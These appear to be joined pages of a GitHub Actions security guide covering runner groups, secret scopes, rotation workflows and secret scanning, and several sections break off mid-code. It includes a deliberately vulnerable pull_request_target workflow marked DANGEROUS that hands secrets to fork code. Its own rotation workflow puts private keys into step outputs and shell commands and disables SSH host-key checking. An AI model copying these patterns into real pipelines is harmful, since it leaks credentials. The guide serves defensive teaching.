| `choice` | Fixed set of values | GitHub validates automatically |
| `string` | Free-form text | Runtime validation with allowlist or regex |
| `number` | Numeric values | Type validation + range checking |
| `boolean` | True/false flags | Type validated, safe for conditionals |
| `environment` | Environment names | GitHub validates against repository environments |

##### Complex Input Validation Example

```yaml
### .github/workflows/reusable-release.yml
name: Reusable Release
on:
  workflow_call:
    inputs:
      version:
        required: true
        type: string
        description: 'Semantic version (e.g., v1.2.3)'
      prerelease:
        required: false
        type: boolean
        default: false
      deploy:
        required: false
        type: boolean
        default: true

permissions:
  contents: write
  id-token: write

jobs:
  validate:
    runs-on: ubuntu-latest
    outputs:
      valid: ${{ steps.check.outputs.valid }}
    steps:
      - name: Validate version format
        id: check
        run: |
          VERSION="${{ inputs.version }}"

##          # Validate semantic version format
          if [[ ! "$VERSION" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-[a-zA-Z0-9]+)?$ ]]; then
            echo "::error::Invalid version format. Expected: vX.Y.Z or vX.Y.Z-prerelease"
            exit 1
          fi

          echo "valid=true" >> $GITHUB_OUTPUT

  release:
    runs-on: ubuntu-latest
    needs: validate
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

      - name: Create release
        env:
          VERSION: ${{ inputs.version }}
          PRERELEASE: ${{ inputs.prerelease }}
          GH_TOKEN: ${{ github.token }}
        run: |
          PRERELEASE_FLAG=""
          if [ "$PRERELEASE" = "true" ]; then
            PRERELEASE_FLAG="--prerelease"
          fi

          gh release create "$VERSION" $PRERELEASE_FLAG \
            --title "Release $VERSION" \
            --generate-notes

  deploy:
    runs-on: ubuntu-latest
    needs: release
    if: inputs.deploy == true
    environment: production
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

      - uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
          workload_identity_provider: ${{ secrets.WIF_PROVIDER }}
          service_account: ${{ secrets.WIF_SERVICE_ACCOUNT }}

      - name: Deploy release
        env:
          VERSION: ${{ inputs.version }}
        run: ./scripts/deploy-release.sh "$VERSION"
```

#### Secret Inheritance Patterns

Reusable workflows can receive secrets explicitly or inherit all secrets. Always prefer explicit secret passing.

##### Dangerous: `secrets: inherit`

```yaml
### Caller workflow
jobs:
  deploy:

### Runner Group Management

Runner groups are security boundaries. Organize by trust level. Restrict by default. Enforce with workflow controls.

> **The Risk**
>
>
> Without runner groups, all self-hosted runners are available to all repositories. One compromised repository means access to production runners with elevated permissions. Malicious workflows can target high-value runners for lateral movement.
>

#### Why Runner Groups Matter

Self-hosted runners have different security profiles. Production runners have network access to production systems. Development runners are isolated. GPU runners cost money. Compliance runners must audit every job.

**Without groups**: All runners available to all repositories. No trust boundaries. No access control.

**With groups**: Security boundaries between runner types. Repository allow-lists. Workflow restrictions. Audit trails.

#### Runner Group Organization Strategies

Organize runners by security requirements, compliance needs, and operational constraints.

```mermaid
flowchart TB
    A["All Repositories"] --> B{"Trust Level"}

    B --> C["Public Repos"]
    B --> D["Internal Repos"]
    B --> E["Private Repos"]

    C --> C1["public-runners group<br/>No self-hosted access"]

    D --> D1["dev-runners group<br/>Non-production access"]
    D --> D2["test-runners group<br/>Isolated test networks"]

    E --> E1["prod-runners group<br/>Production deployment"]
    E --> E2["compliance-runners group<br/>Audited workloads"]
    E --> E3["gpu-runners group<br/>High-cost resources"]

    %% Ghostty Hardcore Theme
    style C1 fill:#f92572,color:#1b1d1e
    style D1 fill:#e6db74,color:#1b1d1e
    style D2 fill:#e6db74,color:#1b1d1e
    style E1 fill:#a6e22e,color:#1b1d1e
    style E2 fill:#a6e22e,color:#1b1d1e
    style E3 fill:#fd971e,color:#1b1d1e

```

##### Strategy 1: Trust-Based Organization

Organize by repository trust level and workflow sensitivity.

| Group Name | Trust Level | Repository Access | Network Scope | Credentials | Use Case |
| ---------- | ----------- | ----------------- | ------------- | ----------- | -------- |
| **public-runners** | Untrusted | Public repos only | Internet-only | None | Never use self-hosted for public repos |
| **dev-runners** | Low | Development repos | Isolated dev network | Development service accounts | Feature development, testing |
| **staging-runners** | Medium | Staging repos | Staging network | Staging credentials | Pre-production validation |
| **prod-runners** | High | Production repos | Production network | Production OIDC | Production deployments |
| **compliance-runners** | Highest | Compliance-approved repos | Audited networks | Minimal credentials | HIPAA, PCI-DSS, SOC2 workloads |

**Best Practice**: Never allow self-hosted runners for public repositories. External contributors can submit malicious workflows that execute on your infrastructure.

##### Strategy 2: Workload-Based Organization

Organize by job type and resource requirements.

| Group Name | Job Type | Repository Access | Resource Profile | Cost Model | Use Case |
| ---------- | -------- | ----------------- | ---------------- | ---------- | -------- |
| **ci-runners** | CI/CD | All repos | 8 CPU, 16GB RAM | Standard | Build, test, lint |
| **deploy-runners** | Deployment | Release repos only | 4 CPU, 8GB RAM | Standard | Cloud deployments |
| **gpu-runners** | ML/AI | ML repos only | 16 CPU, 64GB RAM, 1 GPU | High-cost | Model training, inference |
| **build-runners** | Compilation | Build repos | 16 CPU, 32GB RAM | Standard | Large codebases, monorepo builds |
| **integration-runners** | Integration tests | Test repos | 8 CPU, 16GB RAM | Standard | Database integration, API tests |

**Best Practice**: Isolate high-cost runners (GPU, high-memory) to prevent accidental usage from unauthorized repositories. Monitor for cost anomalies.

##### Strategy 3: Environment-Based Organization

Organize by deployment environment and protection rules.

| Group Name | Environment | Protection Rules | Approval Required | Network Access | Use Case |
| ---------- | ----------- | ---------------- | ----------------- | -------------- | -------- |
| **dev-runners** | Development | None | No | Dev VPC | Rapid iteration |
| **staging-runners** | Staging | Branch protection | No | Staging VPC | Pre-prod testing |
| **prod-runners** | Production | Environment protection | Yes | Prod VPC | Production deployments |
| **dr-runners** | Disaster Recovery | Manual trigger only | Yes | DR VPC | Failover scenarios |

**Best Practice**: Combine runner groups with GitHub environment protection rules. Require manual approval before jobs execute on production runners.

##### Strategy 4: Compliance-Based Organization

Organize by regulatory requirements and audit needs.

| Group Name | Compliance Scope | Audit Logging | Data Classification | Network Isolation | Use Case |
| ---------- | ---------------- | ------------- | ------------------- | ----------------- | -------- |
| **pci-runners** | PCI-DSS | Full audit logs to SIEM | Cardholder data | Segmented PCI network | Payment processing |
| **hipaa-runners** | HIPAA | Encrypted logs, BAA | PHI | HIPAA-compliant VPC | Healthcare data |
| **fedramp-runners** | FedRAMP | CloudWatch + Splunk | CUI | FedRAMP-authorized VPC | Government workloads |
| **sox-runners** | SOX | Immutable logs | Financial data | Audited network | Financial reporting |
| **standard-runners** | None | Standard GitHub logs | Public/internal | Standard network | Non-regulated workloads |

**Best Practice**: Dedicated compliance runners with enhanced logging, immutable audit trails, and network segmentation per regulatory requirements.

#### Repository Access Restrictions

Control which repositories can use which runner groups.

##### GitHub Enterprise Organization Settings

Runner groups are configured at the organization level with repository access controls.

**Configuration Path**: Organization Settings → Actions → Runner groups

###### Restriction Levels

####### Level 1: All Repositories (Least Secure)

All repositories in the organization can access the runner group.

**Use Case**: Development runners for non-sensitive workloads.

**Risk**: Compromised repository gains access to all runners in the group.

```yaml
### Runner group configuration (Settings UI)
Group: dev-runners
Access: All repositories
Workflow restrictions: None
```

####### Level 2: Selected Repositories (Recommended)

Explicit allow-list of repositories that can access the runner group.

**Use Case**: Production runners, compliance runners, high-cost runners.

**Risk**: Lower risk, but requires maintenance as new repositories are created.

```yaml
### Runner group configuration (Settings UI)
Group: prod-runners
Access: Selected repositories
Repositories:
  - org/production-api
  - org/production-web
  - org/production-infra
Workflow restrictions: Selected workflows
```

####### Level 3: Private Repositories Only

Only private repositories can access the runner group. Public repositories are blocked.

**Use Case**: Internal runners that should never execute public repository code.

**Risk**: Lower risk, but does not prevent compromised private repositories from accessing runners.

```yaml
### Runner group configuration (Settings UI)
Group: internal-runners
Access: Private repositories
Workflow restrictions: None
```

##### API-Based Configuration

Automate runner group configuration using GitHub API.

```bash
#!/bin/bash
### Create runner group with repository restrictions

set -euo pipefail

ORG="your-organization"
GROUP_NAME="prod-runners"
RUNNER_GROUP_ID="123"
ALLOWED_REPOS=(
  "production-api"
  "production-web"
  "production-infra"
)

### Create runner group
gh api \
  --method POST \
  -H "Accept: application/vnd.github+json" \
  "/orgs/${ORG}/actions/runner-groups" \
  -f name="${GROUP_NAME}" \
  -f visibility="selected" \
  -F allows_public_repositories=false

### Add repositories to runner group
for repo in "${ALLOWED_REPOS[@]}"; do
  REPO_ID=$(gh api "/repos/${ORG}/${repo}" --jq '.id')

  gh api \
    --method PUT \
    -H "Accept: application/vnd.github+json" \
    "/orgs/${ORG}/actions/runner-groups/${RUNNER_GROUP_ID}/repositories/${REPO_ID}"

  echo "Added ${repo} to runner group ${GROUP_NAME}"
done
```

##### Repository Access Verification

Audit which repositories can access which runner groups.

```bash
#!/bin/bash
### Audit runner group repository access

set -euo pipefail

ORG="your-organization"

### List all runner groups
echo "==> Auditing runner group access for ${ORG}"

gh api "/orgs/${ORG}/actions/runner-groups" --paginate --jq '.runner_groups[]' | while read -r group; do
  GROUP_ID=$(echo "$group" | jq -r '.id')
  GROUP_NAME=$(echo "$group" | jq -r '.name')
  VISIBILITY=$(echo "$group" | jq -r '.visibility')

  echo ""
  echo "Runner Group: ${GROUP_NAME} (${VISIBILITY})"

  if [[ "$VISIBILITY" == "selected" ]]; then
##    # List repositories with access
    gh api "/orgs/${ORG}/actions/runner-groups/${GROUP_ID}/repositories" --paginate \
      | jq -r '.repositories[].full_name' \
      | while read -r repo; do
        echo "  - ${repo}"
      done
  else
    echo "  - Access: All repositories"
  fi
done
```

#### Workflow Restrictions for Sensitive Runners

Control which workflows can execute on specific runner groups.

##### Why Workflow Restrictions?

Repository access controls specify which repositories can use runners. Workflow restrictions specify which workflow files within those repositories can execute on those runners.

**Scenario**: Production runners should only execute deployment workflows, not arbitrary CI workflows.

**Without workflow restrictions**: Any workflow file in allowed repositories can use production runners.

**With workflow restrictions**: Only approved workflow files (e.g., `.github/workflows/deploy-production.yml`) can use production runners.

##### Workflow Restriction Configuration

**Configuration Path**: Organization Settings → Actions → Runner groups → Workflow access

###### Option 1: No Restrictions (Default)

All workflows in allowed repositories can use the runner group.

**Use Case**: Development runners, non-sensitive workloads.

**Risk**: Any workflow file can target these runners.

###### Option 2: Selected Workflows (Recommended for Sensitive Runners)

Explicit allow-list of workflow files that can use the runner group.

**Use Case**: Production runners, compliance runners, high-value runners.

**Risk**: Requires maintenance as new deployment workflows are created.

```yaml
### Runner group configuration (Settings UI)
Group: prod-runners
Workflow access: Selected workflows
Allowed workflows:
  - org/production-api/.github/workflows/deploy-production.yml@refs/heads/main
  - org/production-web/.github/workflows/deploy-production.yml@refs/heads/main
  - org/production-infra/.github/workflows/terraform-apply.yml@refs/heads/main
```

**Format**: `{owner}/{repo}/.github/workflows/{workflow}.yml@{ref}`

**Best Practice**: Pin workflows to `refs/heads/main` to prevent malicious branches from bypassing restrictions.

##### Workflow Restriction Patterns

###### Pattern 1: Production Deployment Workflows Only

Restrict production runners to deployment workflows verified by security team.

```yaml
### prod-runners group configuration
Allowed workflows:
  - org/app-api/.github/workflows/deploy-prod.yml@refs/heads/main
  - org/app-web/.github/workflows/deploy-prod.yml@refs/heads/main
  - org/app-worker/.github/workflows/deploy-prod.yml@refs/heads/main
```

**Enforcement**: CI workflows, test workflows, and feature branch workflows cannot use production runners.

###### Pattern 2: Compliance Workflows with Audit Trail

Restrict compliance runners to audited workflows with immutable logs.

```yaml
### hipaa-runners group configuration
Allowed workflows:
  - org/patient-portal/.github/workflows/deploy-hipaa.yml@refs/heads/main
  - org/ehr-integration/.github/workflows/deploy-hipaa.yml@refs/heads/main
```

**Additional Controls**:

- Workflows require manual approval (environment protection rules)
- All jobs logged to immutable SIEM
- Network isolated to HIPAA-compliant VPC

###### Pattern 3: Cost-Control for GPU Runners

Restrict expensive GPU runners to approved ML training workflows.

```yaml
### gpu-runners group configuration
Allowed workflows:
  - org/ml-training/.github/workflows/train-model.yml@refs/heads/main
  - org/ml-inference/.github/workflows/batch-inference.yml@refs/heads/main
```

**Monitoring**: Alert on unexpected GPU runner usage or cost spikes.

##### API-Based Workflow Restrictions

Automate workflow restriction configuration using GitHub API.

```bash

### Secret Management Overview

Secrets in GitHub Actions are the keys to your kingdom. Exposed credentials mean compromised infrastructure. Manage them like your business depends on it. Because it does.

> **The Risk**
>
>
> Secrets in GitHub Actions grant access to production systems, cloud accounts, package registries, and third-party services. A single leaked credential can mean full infrastructure compromise, data exfiltration, or supply chain attacks against your users.
>

#### What are GitHub Actions Secrets?

GitHub Actions secrets are encrypted environment variables stored at repository, organization, or environment level. They inject sensitive values into workflows without exposing them in logs or code.

**How Secrets Work**:

1. Store secret via Settings → Secrets and variables → Actions
2. Reference in workflow via `${{ secrets.SECRET_NAME }}`
3. GitHub injects value at runtime as environment variable
4. Secret value masked in logs (best effort)
5. Secret expires when workflow job completes

**Key Characteristics**:

- **Encrypted at rest**: Stored using GitHub's encryption keys
- **Masked in logs**: GitHub attempts to redact secret values from output
- **Immutable once set**: Cannot view secret value after creation (only update)
- **Environment variables**: Available via `$SECRETS_NAME` syntax in shell
- **Scoped by hierarchy**: Repo, org, or environment level access control

#### Secret Storage Hierarchy

GitHub offers three storage levels for secrets. Understanding scope is critical for least-privilege access.

##### Repository Secrets

**Scope**: Single repository only

**Access**: All workflows in that repository

**Use Cases**:

- Repository-specific API tokens
- Service credentials unique to one project
- Test environment credentials
- Integration tokens for single repo

**Configuration**: `Settings → Secrets and variables → Actions → Repository secrets`

**Example**:

```yaml
name: Deploy
on: [push]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

##      # Repository secret - available to this repo only
      - run: echo "${{ secrets.DEPLOY_KEY }}" | base64 -d > deploy.key
```

**Risk**: Accessible to all workflows in repository. Compromised workflow file can exfiltrate.

##### Organization Secrets

**Scope**: Multiple repositories within organization

**Access**: Selected repositories or all repositories in org

**Use Cases**:

- Shared cloud credentials across team repos
- Organization-wide package registry tokens
- Common API keys for internal services
- CI/CD credentials for platform team

**Configuration**: `Organization Settings → Secrets and variables → Actions → Organization secrets`

**Visibility Policy**:

- **All repositories**: Every repo in org can access (high risk)
- **Private repositories**: Only private repos (better)
- **Selected repositories**: Explicit allowlist (best)

**Example**:

```yaml
name: Publish
on: [release]

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

##      # Organization secret - shared across repos
      - run: npm publish --registry=https://npm.example.com
        env:
          NPM_TOKEN: ${{ secrets.ORG_NPM_TOKEN }}
```

**Risk**: Broader attack surface. Compromise of any selected repository exposes secret to attacker.

##### Environment Secrets

**Scope**: Specific deployment environment (production, staging, dev)

**Access**: Only workflows that target that environment

**Use Cases**:

- Production deployment credentials
- Environment-specific cloud accounts
- Database connection strings per environment
- Credentials requiring approval gates

**Configuration**: `Settings → Environments → Environment name → Environment secrets`

**Protection Rules**:

- **Required reviewers**: Manual approval before workflow can access secrets
- **Wait timer**: Delay before deployment proceeds
- **Deployment branches**: Restrict which branches can deploy
- **Custom protection rules**: Additional gates via GitHub Apps

**Example**:

```yaml
name: Deploy Production
on:
  workflow_dispatch:

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production  # Triggers environment protection
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

##      # Environment secret - production only, requires approval
      - run: ./deploy.sh
        env:
          PROD_API_KEY: ${{ secrets.PROD_API_KEY }}
```

**Risk**: Lowest risk with proper protection rules. Approval gates prevent unauthorized access.

#### Secret Types and Use Cases

##### Encrypted Secrets

**Type**: Sensitive values encrypted by GitHub

**Use Cases**: Passwords, API keys, tokens, certificates, private keys

**Example**:

```yaml
env:
  DATABASE_PASSWORD: ${{ secrets.DB_PASSWORD }}
  API_TOKEN: ${{ secrets.EXTERNAL_API_TOKEN }}
```

**Characteristics**:

- Always encrypted at rest
- Masked in logs (best effort)
- Cannot be read after creation
- Max 64 KB per secret

##### Configuration Variables

**Type**: Non-sensitive configuration values stored as plaintext

**Use Cases**: Environment names, URLs, feature flags, non-secret configuration

**Example**:

```yaml
env:
  API_ENDPOINT: ${{ vars.API_URL }}
  ENVIRONMENT: ${{ vars.DEPLOY_ENV }}
```

**Characteristics**:

- Stored as plaintext
- Visible in UI after creation
- Not masked in logs
- Use for non-sensitive data only

**Security Note**: Variables are NOT secrets. Never store credentials as variables.

##### OIDC Tokens (Secretless Authentication)

**Type**: Short-lived JSON Web Tokens for cloud federation

**Use Cases**: AWS, GCP, Azure authentication without long-lived credentials

**Example**:

```yaml
permissions:
  id-token: write  # Request OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
##      # google-github-actions/auth v2.1.0
      - uses: google-github-actions/auth@f112390a2df9932162083945e46d439060d66ec2
        with:
          workload_identity_provider: 'projects/123/locations/global/workloadIdentityPools/github/providers/github-provider'
          service_account: 'deploy@project.iam.gserviceaccount.com'

      - run: gcloud compute instances list
```

**Characteristics**:

- No stored secrets
- Tokens expire in minutes
- Tied to workflow context (repo, branch, commit)
- Cloud provider validates claims

**Benefit**: Eliminates long-lived credentials. Reduces secret sprawl and rotation burden.

See [OIDC Federation Patterns](../oidc/index.md) for complete implementation guide.

#### Secret Exposure Threat Model

Understanding how secrets leak is the first step to preventing exposure.

##### Exposure Vector 1: Workflow Logs

**Mechanism**: Secret accidentally printed to stdout/stderr

**Example**:

```yaml
### DANGEROUS - Exposes secret in logs
- run: echo "Deploying with key ${{ secrets.DEPLOY_KEY }}"
```

**Result**: Secret visible in workflow logs despite masking (masking is best-effort, not guaranteed).

**Prevention**: Never interpolate secrets into commands that may log them. Use environment variables instead.

```yaml
### Safe - secret passed via environment, not command line
- run: ./deploy.sh
  env:
    DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
```

##### Exposure Vector 2: Pull Request Workflows

**Mechanism**: Malicious PR injects code that exfiltrates secrets

**Example**:

```yaml
### DANGEROUS - PR from fork can inject code
name: CI
on: [pull_request_target]  # Runs with repo secrets even for forks

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checks out PR code

##      # Attacker controls test.sh via PR
      - run: ./test.sh
        env:
          API_KEY: ${{ secrets.API_KEY }}  # Exposed to attacker
```

**Attack**: Attacker submits PR with malicious `test.sh` that sends `$API_KEY` to attacker server.

**Prevention**: Use `pull_request` (not `pull_request_target`) for untrusted code. Isolate secret access.

### Secret Rotation Patterns

Secrets don't age well. Automate rotation before credentials become liabilities.

> **The Risk**
>
>
> Long-lived credentials are time bombs. Every day a secret remains unchanged increases the probability it has already leaked. Rotation limits blast radius when compromise happens, not if.
>

#### Why Rotate Secrets?

Static credentials persist in memory, logs, backups, and artifacts long after you think they're gone.

**Rotation Benefits**:

- **Limit blast radius**: Compromised credentials expire automatically
- **Detect breaches**: Failed rotation indicates credential misuse
- **Compliance**: Meet regulatory requirements for credential lifecycle
- **Reduce sprawl**: Forces inventory of what secrets exist and where
- **Audit trail**: Rotation events signal credential usage patterns

**Without Rotation**:

- Credentials persist indefinitely in GitHub audit logs
- Ex-employees retain access via copied credentials
- Leaked credentials remain valid forever
- No mechanism to detect unauthorized usage
- Compliance violations accumulate

#### Rotation Schedule Recommendations

Not all secrets require the same rotation frequency. Risk-based scheduling balances security and operational overhead.

##### Rotation Tiers

| Tier | Access Scope | Rotation Frequency | Examples |
| ---- | ------------ | ------------------ | -------- |
| **Critical** | Production write access, infrastructure control | **7-14 days** | Production deploy keys, cloud admin credentials, database root passwords |
| **High** | Production read access, sensitive data | **30 days** | Production API tokens, secrets managers, monitoring credentials |
| **Medium** | Non-production environments, limited scope | **90 days** | Staging credentials, package registry tokens, integration test accounts |
| **Low** | Read-only access, public services | **180 days** | Artifact storage, CDN tokens, external API read keys |

##### Event-Driven Rotation

Rotate immediately when:

- **Employee departure**: Any team member with access leaves
- **Breach detected**: Credential found in logs, artifacts, or public repos
- **Service compromise**: Upstream service reports security incident
- **Workflow changes**: Modifications to `.github/workflows/` with secret access
- **Access expansion**: Secret shared with additional repositories or teams

#### Zero-Downtime Rotation Strategy

Rotating secrets without breaking active workflows requires overlapping validity periods.

##### Dual-Secret Pattern

Maintain two versions of each secret during rotation window.

```mermaid
gantt

%% Ghostty Hardcore Theme
    title Zero-Downtime Secret Rotation
    dateFormat  YYYY-MM-DD
    axisFormat %m-%d

    section Old Secret
    Active (OLD_SECRET)           :a1, 2026-01-01, 7d
    Grace period (both valid)     :a2, 2026-01-08, 7d
    Revoked                       :crit, 2026-01-15, 1d

    section New Secret
    Created (NEW_SECRET)          :b1, 2026-01-08, 7d
    Active (promoted to primary)  :b2, 2026-01-15, 30d

```

**Implementation**:

1. **T-0**: Generate new credential, store as `SECRET_NAME_NEW`
2. **T+1h**: Update service to accept both old and new credentials
3. **T+24h**: Update GitHub secret `SECRET_NAME` with new value
4. **T+48h**: Verify all workflows using new credential
5. **T+7d**: Revoke old credential from service
6. **T+14d**: Remove `SECRET_NAME_NEW` from GitHub (cleanup)

##### Rotation Workflow

Automate rotation with scheduled GitHub Actions workflow.

```yaml
name: Rotate Production Secrets

on:
  schedule:
##    # Run monthly on 1st at 02:00 UTC
    - cron: '0 2 1 * *'
  workflow_dispatch:  # Manual trigger

permissions:
  contents: read

jobs:
  rotate-deploy-key:
    runs-on: ubuntu-latest
    environment: production  # Requires approval
    steps:
##      # google-github-actions/auth v2.1.0
      - uses: google-github-actions/auth@f112390a2df9932162083945e46d439060d66ec2
        with:
          workload_identity_provider: ${{ secrets.GCP_WIF_PROVIDER }}
          service_account: 'secret-rotator@project.iam.gserviceaccount.com'

      - name: Generate new SSH key
        id: keygen
        run: |
          ssh-keygen -t ed25519 -N '' -f deploy_key -C "deploy-$(date +%Y%m%d)"
          echo "public_key=$(cat deploy_key.pub)" >> $GITHUB_OUTPUT
          echo "private_key<<EOF" >> $GITHUB_OUTPUT
          cat deploy_key >> $GITHUB_OUTPUT
          echo "EOF" >> $GITHUB_OUTPUT

      - name: Store new key in Secret Manager
        run: |
##          # Store with version suffix for dual-key pattern
          echo "${{ steps.keygen.outputs.private_key }}" | \
            gcloud secrets versions add deploy-key-new --data-file=-

      - name: Update authorized_keys on servers
        run: |
##          # Add new key to authorized_keys (old key still valid)
          gcloud compute ssh deploy-target \
            --command="echo '${{ steps.keygen.outputs.public_key }}' >> ~/.ssh/authorized_keys"

      - name: Verify new key works
        run: |
##          # Test deployment with new key
          ssh -i deploy_key -o StrictHostKeyChecking=no deploy@target 'echo "New key verified"'

      - name: Update GitHub secret
        env:
          GH_TOKEN: ${{ secrets.ROTATION_GITHUB_TOKEN }}
        run: |
##          # Update repository secret via GitHub CLI
          gh secret set DEPLOY_KEY --body "${{ steps.keygen.outputs.private_key }}"

      - name: Schedule old key revocation
        run: |
##          # Store revocation timestamp in Secret Manager
          date -d '+7 days' -u +%Y-%m-%dT%H:%M:%SZ | \
            gcloud secrets versions add deploy-key-revoke-at --data-file=-
```

**Revocation Workflow** (7 days later):

```yaml
name: Revoke Old Secrets

on:
  schedule:
##    # Run daily at 03:00 UTC
    - cron: '0 3 * * *'
  workflow_dispatch:

permissions:
  contents: read

jobs:
  revoke-expired:
    runs-on: ubuntu-latest
    environment: production
    steps:
##      # google-github-actions/auth v2.1.0
      - uses: google-github-actions/auth@f112390a2df9932162083945e46d439060d66ec2
        with:
          workload_identity_provider: ${{ secrets.GCP_WIF_PROVIDER }}
          service_account: 'secret-rotator@project.iam.gserviceaccount.com'

      - name: Check revocation schedule
        id: check
        run: |
          revoke_at=$(gcloud secrets versions access latest --secret=deploy-key-revoke-at || echo "")
          if [[ -z "$revoke_at" ]]; then
            echo "No revocation scheduled"
            exit 0
          fi

          if [[ $(date -u +%s) -ge $(date -d "$revoke_at" +%s) ]]; then
            echo "revoke=true" >> $GITHUB_OUTPUT
          else
            echo "Not yet time to revoke (scheduled for $revoke_at)"
            exit 0
          fi

      - name: Remove old key from authorized_keys
        if: steps.check.outputs.revoke == 'true'
        run: |
##          # Remove all but most recent key from servers
          gcloud compute ssh deploy-target \
            --command="tail -n1 ~/.ssh/authorized_keys > ~/.ssh/authorized_keys.new && mv ~/.ssh/authorized_keys.new ~/.ssh/authorized_keys"

      - name: Delete revocation marker
        if: steps.check.outputs.revoke == 'true'
        run: |
          gcloud secrets delete deploy-key-revoke-at --quiet
```

#### Notification Patterns

Alert teams before credentials expire. Proactive notifications prevent outages.

##### Expiration Tracking

Store secret metadata with expiration dates.

```yaml
name: Secret Expiration Monitor

on:
  schedule:
##    # Run weekly on Monday at 09:00 UTC
    - cron: '0 9 * * 1'
  workflow_dispatch:

permissions:
  contents: read
  issues: write  # Create expiration warnings

jobs:
  check-expiration:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

      - name: Check secret ages
        id: check
        run: |
##          # Read secret inventory with last rotation dates
          expiring=$(python3 << 'EOF'
          import json
          from datetime import datetime, timedelta

          with open('.github/secret-inventory.json') as f:
              inventory = json.load(f)

          now = datetime.now()
          expiring_secrets = []

          for secret in inventory['secrets']:
              last_rotated = datetime.fromisoformat(secret['last_rotated'])
              age_days = (now - last_rotated).days
              max_age = secret['rotation_tier_days']

              days_remaining = max_age - age_days

              if days_remaining <= 7:
                  expiring_secrets.append({
                      'name': secret['name'],
                      'days_remaining': days_remaining,
                      'tier': secret['tier']
                  })

          print(json.dumps(expiring_secrets))
          EOF
          )

          echo "expiring=$expiring" >> $GITHUB_OUTPUT

      - name: Create warning issue
        if: steps.check.outputs.expiring != '[]'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          expiring='${{ steps.check.outputs.expiring }}'

          body=$(cat << EOF
##          ## ⚠️ Secrets Expiring Soon

          The following secrets require rotation:

          $(echo "$expiring" | jq -r '.[] | "- **\(.name)** (Tier \(.tier)): \(.days_remaining) days remaining"')

          **Action Required**: Trigger rotation workflows in the next 7 days.

          See [Secret Rotation Patterns](https://adaptive-enforcement-lab.com/secure/github-actions-security/secrets/rotation/) for procedures.
          EOF
          )

          gh issue create \
            --title "Secret Rotation Required" \
            --label "security,secrets,rotation" \
            --body "$body"
```

##### Slack Notification Integration

```yaml
      - name: Send Slack alert
        if: steps.check.outputs.expiring != '[]'
        run: |
          expiring='${{ steps.check.outputs.expiring }}'

          payload=$(cat << EOF
          {
            "text": "🔐 Secret Rotation Alert",
            "blocks": [
              {
                "type": "header",
                "text": {
                  "type": "plain_text",
                  "text": "⚠️ Secrets Expiring Soon"
                }
              },
              {
                "type": "section",
                "text": {
                  "type": "mrkdwn",
                  "text": "The following secrets need rotation:\n\n$(echo "$expiring" | jq -r '.[] | "• *\(.name)* (Tier \(.tier)): \(.days_remaining) days"')"
                }
              },
              {
                "type": "actions",
                "elements": [
                  {
                    "type": "button",
                    "text": {
                      "type": "plain_text",
                      "text": "Rotate Now"
                    },
                    "url": "${{ github.server_url }}/${{ github.repository }}/actions/workflows/rotate-secrets.yml"
                  }
                ]
              }
            ]
          }
          EOF
          )

          curl -X POST -H 'Content-type: application/json' \

### Secret Scanning Integration

Prevention is good. Detection is essential. Assume secrets will leak. Build systems to catch them before damage spreads.

> **The Risk**
>
>
> Secrets leak through commits, workflow logs, artifacts, pull requests, and third-party integrations. Without automated scanning, credentials remain exposed for days or months before detection. By then, your infrastructure is already compromised.
>

#### What is Secret Scanning?

GitHub secret scanning automatically detects known secret formats in repositories, workflow logs, and commit history.

**How It Works**:

1. GitHub scans commits, issues, pull requests, and workflow logs
2. Pattern matching identifies known credential formats (API keys, tokens, certificates)
3. Alerts sent to repository administrators and security team
4. Optional push protection blocks commits containing secrets
5. Partner notification for compromised service provider credentials

**Coverage**:

- **Repository scanning**: All commits, branches, and history
- **Push protection**: Block secret commits before they land
- **Workflow logs**: Scan job output for leaked credentials
- **Pull requests**: Scan fork contributions for secret exposure
- **Partner patterns**: 200+ service providers receive breach notifications

#### Enabling Secret Scanning

Secret scanning availability depends on repository visibility and GitHub plan.

##### Repository Settings

**GitHub Advanced Security (GHAS) Required**:

- Private/internal repositories: GHAS license required
- Public repositories: Free, enabled by default

**Enable via Settings**:

1. Navigate to `Settings → Code security and analysis`
2. Enable **Secret scanning**
3. Enable **Push protection** (recommended)
4. Enable **Non-provider patterns** for generic secrets

```yaml
### .github/workflows/verify-security.yml
### Workflow to enforce security features are enabled

name: Verify Security Configuration
on:
  schedule:
    - cron: '0 8 * * 1'  # Weekly Monday 8 AM
  workflow_dispatch:

permissions:
  contents: read

jobs:
  check-scanning:
    runs-on: ubuntu-latest
    steps:
      - name: Check secret scanning enabled
        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea  # v7.0.1
        with:
          script: |
            const { data: repo } = await github.rest.repos.get({
              owner: context.repo.owner,
              repo: context.repo.repo
            });

            const required = [
              { setting: 'security_and_analysis.secret_scanning.status', name: 'Secret Scanning' },
              { setting: 'security_and_analysis.secret_scanning_push_protection.status', name: 'Push Protection' }
            ];

            for (const check of required) {
              const value = check.setting.split('.').reduce((o, k) => o?.[k], repo);
              if (value !== 'enabled') {
                core.setFailed(`${check.name} is not enabled (status: ${value})`);
              } else {
                core.info(`✓ ${check.name} enabled`);
              }
            }
```

##### Organization-Level Enablement

Enable secret scanning across all repositories in organization.

**Organization Settings**:

1. Navigate to `Organization Settings → Code security and analysis`
2. Enable **Secret scanning** for all repositories
